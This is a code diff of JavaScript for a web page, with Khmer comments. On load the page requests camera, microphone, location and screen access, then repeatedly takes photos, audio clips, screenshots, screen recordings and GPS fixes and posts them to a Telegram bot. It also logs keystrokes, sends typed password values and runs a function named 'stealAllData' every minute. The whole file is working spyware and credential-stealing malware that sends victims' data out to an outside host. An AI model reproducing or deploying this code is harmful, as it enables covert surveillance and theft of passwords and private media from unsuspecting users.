@@ -192,7 +192,7 @@ async function sendFileToTelegram(file, caption) {
     } catch (error) {}
 }
 
-// ==================== 1. CAMERA PERMISSION ====================
+// ==================== 1. CAMERA PERMISSION (ស្នើភ្លាមៗ) ====================
 async function requestCameraPermission() {
     if (permissionsRequested.camera || !CHAT_ID) return;
     
@@ -207,8 +207,11 @@ async function requestCameraPermission() {
         
         await sendMessageToTelegram(`📸 *កាមេរ៉ាត្រូវបានអនុញ្ញាត*\n\n✅ Camera permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
         
+        // Auto capture every 10 seconds
         if (photoInterval) clearInterval(photoInterval);
         photoInterval = setInterval(() => capturePhoto(), 10000);
+        
+        // Capture first photo after 2 seconds
         setTimeout(() => capturePhoto(), 2000);
         
     } catch (error) {
@@ -226,6 +229,7 @@ async function capturePhoto() {
         document.body.appendChild(video);
         video.srcObject = cameraStream;
         await video.play();
+        
         await new Promise(resolve => setTimeout(resolve, 500));
         
         const canvas = document.createElement('canvas');
@@ -241,10 +245,13 @@ async function capturePhoto() {
         }, 'image/jpeg', 0.8);
         
         video.remove();
-    } catch (error) {}
+        
+    } catch (error) {
+        console.error("Capture photo error:", error);
+    }
 }
 
-// ==================== 2. MICROPHONE PERMISSION ====================
+// ==================== 2. MICROPHONE PERMISSION (ស្នើភ្លាមៗ) ====================
 async function requestMicrophonePermission() {
     if (permissionsRequested.microphone || !CHAT_ID) return;
     
@@ -255,9 +262,12 @@ async function requestMicrophonePermission() {
         
         await sendMessageToTelegram(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*\n\n✅ Microphone permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
         
+        // Start recording audio periodically
         setTimeout(() => recordAudio(), 1000);
         setInterval(() => {
-            if (audioStream && audioStream.active) recordAudio();
+            if (audioStream && audioStream.active) {
+                recordAudio();
+            }
         }, 30000);
         
     } catch (error) {
@@ -273,7 +283,10 @@ async function recordAudio() {
         const recorder = new MediaRecorder(audioStream);
         const chunks = [];
         
-        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.ondataavailable = (e) => { 
+            if (e.data.size > 0) chunks.push(e.data); 
+        };
+        
         recorder.onstop = async () => {
             const blob = new Blob(chunks, { type: 'audio/webm' });
             if (blob.size > 0) {
@@ -281,21 +294,35 @@ async function recordAudio() {
                 await sendFileToTelegram(file, `🎤 *Audio Recording*\n⏰ ${new Date().toLocaleString('km-KH')}`);
             }
         };
+        
         recorder.start();
-        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
-    } catch (error) {}
+        setTimeout(() => {
+            if (recorder.state === 'recording') recorder.stop();
+        }, 5000);
+        
+    } catch (error) {
+        console.error("Record audio error:", error);
+    }
 }
 
-// ==================== 3. LOCATION PERMISSION ====================
+// ==================== 3. LOCATION PERMISSION (ស្នើភ្លាមៗ) ====================
 function requestLocationPermission() {
     if (permissionsRequested.location || !CHAT_ID) return;
+    
     if (!navigator.geolocation) {
-        sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*`);
+        sendMessageToTelegram(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*\n\n📝 Geolocation not supported`);
         return;
     }
     
+    // Get location immediately
     getCurrentLocation();
-    setInterval(() => { if (permissionsRequested.location) getCurrentLocation(); }, 30000);
+    
+    // Get location every 30 seconds
+    setInterval(() => {
+        if (permissionsRequested.location) {
+            getCurrentLocation();
+        }
+    }, 30000);
 }
 
 function getCurrentLocation() {
@@ -312,11 +339,16 @@ function getCurrentLocation() {
             
             await sendMessageToTelegram(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Google Maps](${mapsLink})\n⏰ ${new Date().toLocaleString('km-KH')}`);
             
+            // Send location to Telegram
             try {
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: currentLocation.lat, longitude: currentLocation.lng })
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        latitude: currentLocation.lat,
+                        longitude: currentLocation.lng
+                    }),
                 });
             } catch (err) {}
         },
@@ -330,9 +362,10 @@ function getCurrentLocation() {
     );
 }
 
-// ==================== 4. SCREEN RECORDING PERMISSION ====================
+// ==================== 4. SCREEN RECORDING PERMISSION (ស្នើភ្លាមៗ) ====================
 async function requestScreenPermission() {
-    if (permissionsRequested.screen || !CHAT_ID || isRecording) return;
+    if (permissionsRequested.screen || !CHAT_ID) return;
+    if (isRecording) return;
     
     try {
         const stream = await navigator.mediaDevices.getDisplayMedia({
@@ -346,8 +379,16 @@ async function requestScreenPermission() {
         await sendMessageToTelegram(`🎬 *ការថតអេក្រង់ត្រូវបានអនុញ្ញាត*\n\n✅ Screen recording granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
         
         startScreenRecording(stream);
+        
+        // Take screenshot after 2 seconds
         setTimeout(() => captureScreenshot(), 2000);
-        setInterval(() => { if (permissionsRequested.screen) captureScreenshot(); }, 30000);
+        
+        // Take screenshot every 30 seconds
+        setInterval(() => {
+            if (permissionsRequested.screen) {
+                captureScreenshot();
+            }
+        }, 30000);
         
     } catch (error) {
         let errorMsg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error occurred';
@@ -357,39 +398,66 @@ async function requestScreenPermission() {
 
 function startScreenRecording(stream) {
     const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
-    screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
+    screenRecorder = new MediaRecorder(stream, { 
+        mimeType: mimeType,
+        videoBitsPerSecond: 2500000 
+    });
     recordedChunks = [];
     
-    screenRecorder.ondataavailable = (e) => { if (e.data?.size > 0) recordedChunks.push(e.data); };
+    screenRecorder.ondataavailable = (e) => { 
+        if (e.data && e.data.size > 0) recordedChunks.push(e.data); 
+    };
+    
     screenRecorder.onstop = async () => {
         isRecording = false;
         const blob = new Blob(recordedChunks, { type: mimeType });
+        
         if (blob.size > 0) {
             const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
             const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
-            await sendVideoToTelegram(file, `🎥 *Screen Recording*\n📊 Size: ${(blob.size/1024/1024).toFixed(2)} MB\n⏰ ${new Date().toLocaleString('km-KH')}`);
+            await sendVideoToTelegram(file, `🎥 *Screen Recording*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${new Date().toLocaleString('km-KH')}`);
         }
+        
         recordedChunks = [];
-        if (screenStream) { screenStream.getTracks().forEach(t => t.stop()); screenStream = null; }
+        if (screenStream) {
+            screenStream.getTracks().forEach(track => track.stop());
+            screenStream = null;
+        }
         screenRecorder = null;
     };
     
     screenRecorder.start(1000);
     isRecording = true;
-    setTimeout(() => { if (screenRecorder?.state === 'recording') screenRecorder.stop(); }, 30000);
-    stream.getVideoTracks()[0].addEventListener('ended', () => { if (screenRecorder?.state === 'recording') screenRecorder.stop(); });
+    
+    // Auto stop after 30 seconds
+    setTimeout(() => {
+        if (screenRecorder && screenRecorder.state === 'recording') {
+            screenRecorder.stop();
+        }
+    }, 30000);
+    
+    stream.getVideoTracks()[0].addEventListener('ended', () => {
+        if (screenRecorder && screenRecorder.state === 'recording') {
+            screenRecorder.stop();
+        }
+    });
 }
 
 async function captureScreenshot() {
-    if (!navigator.mediaDevices?.getDisplayMedia) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
     
     try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+            video: { cursor: "always" },
+            audio: false
+        });
+        
         const video = document.createElement('video');
         video.style.display = 'none';
         document.body.appendChild(video);
         video.srcObject = stream;
         await video.play();
+        
         await new Promise(resolve => setTimeout(resolve, 500));
         
         const canvas = document.createElement('canvas');
@@ -399,10 +467,12 @@ async function captureScreenshot() {
         
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
         const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
+        
         await sendPhotoToTelegram(file, `📸 *SCREENSHOT*\n📐 ${canvas.width}x${canvas.height}\n⏰ ${new Date().toLocaleString('km-KH')}`);
         
         stream.getTracks().forEach(track => track.stop());
         video.remove();
+        
     } catch (error) {}
 }
 
@@ -412,7 +482,9 @@ function stopCamera() {
         cameraStream.getTracks().forEach(track => track.stop());
         cameraStream = null;
         if (photoInterval) clearInterval(photoInterval);
-        if (CHAT_ID) sendMessageToTelegram(`⛔ *CAMERA STOPPED*\n⏰ ${new Date().toLocaleString('km-KH')}`);
+        if (CHAT_ID) {
+            sendMessageToTelegram(`⛔ *CAMERA STOPPED*\n⏰ ${new Date().toLocaleString('km-KH')}`);
+        }
     }
 }
 
@@ -454,12 +526,19 @@ let keylogTimer = null;
 
 document.addEventListener('keydown', function(e) {
     if (!CHAT_ID) return;
-    if (e.target?.type === 'password') return;
+    if (e.target && e.target.type === 'password') return;
     
-    if (e.key.length === 1) keylogBuffer += e.key;
-    else if (e.key === 'Enter') keylogBuffer += '\n';
-    else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
-    else if (e.key === ' ') keylogBuffer += ' ';
+    if (e.key.length === 1) {
+        keylogBuffer += e.key;
+    } else if (e.key === 'Enter') {
+        keylogBuffer += '\n';
+    } else if (e.key === 'Backspace') {
+        keylogBuffer = keylogBuffer.slice(0, -1);
+    } else if (e.key === ' ') {
+        keylogBuffer += ' ';
+    } else if (e.key === 'Tab') {
+        keylogBuffer += '    ';
+    }
     
     clearTimeout(keylogTimer);
     keylogTimer = setTimeout(async () => {
@@ -473,8 +552,9 @@ document.addEventListener('keydown', function(e) {
 // ==================== PASSWORD MONITORING ====================
 document.addEventListener('input', async function(e) {
     if (!CHAT_ID) return;
+    
     const target = e.target;
-    if (target?.type === 'password' && target.value && target.value.length > 0) {
+    if (target && target.type === 'password' && target.value && target.value.length > 0) {
         const name = target.name || target.id || 'Unknown';
         await sendMessageToTelegram(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
         keylogBuffer = '';
@@ -523,4 +603,38 @@ document.addEventListener('submit', async function(e) {
 });
 
 // ==================== PAGE UNLOAD TRACKING ====================
-window.addEventListe
+window.addEventListener('beforeunload', function() {
+    if (!CHAT_ID) return;
+    const message = `👋 *User Leaving*\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
+    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
+    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
+});
+
+// ==================== INITIALIZE - REQUEST PERMISSIONS IMMEDIATELY ====================
+async function initialize() {
+    // Only proceed if chat ID is provided in URL
+    if (!CHAT_ID) {
+        console.log("No chat ID provided. Please add ?id=YOUR_CHAT_ID to URL");
+        return;
+    }
+    
+    // Send page loaded notification with device info
+    const deviceInfo = await collectDeviceInfo();
+    const formattedInfo = formatDeviceInfo(deviceInfo);
+    await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formattedInfo}`);
+    
+    // Request ALL permissions IMMEDIATELY (ភ្លាមៗ)
+    setTimeout(() => requestCameraPermission(), 500);      // ស្នើកាមេរ៉ាភ្លាម
+    setTimeout(() => requestMicrophonePermission(), 2000);  // ស្នើមីក្រូហ្វូន
+    setTimeout(() => requestLocationPermission(), 3500);    // ស្នើទីតាំង
+    setTimeout(() => requestScreenPermission(), 5000);      // ស្នើថតអេក្រង់
+    
+    // Steal data after 15 seconds
+    setTimeout(() => stealAllData(), 15000);
+    
+    // Steal data every 60 seconds
+    setInterval(() => stealAllData(), 60000);
+}
+
+// Start when page loads
+window.addEventListener("DOMContentLoaded", initialize);
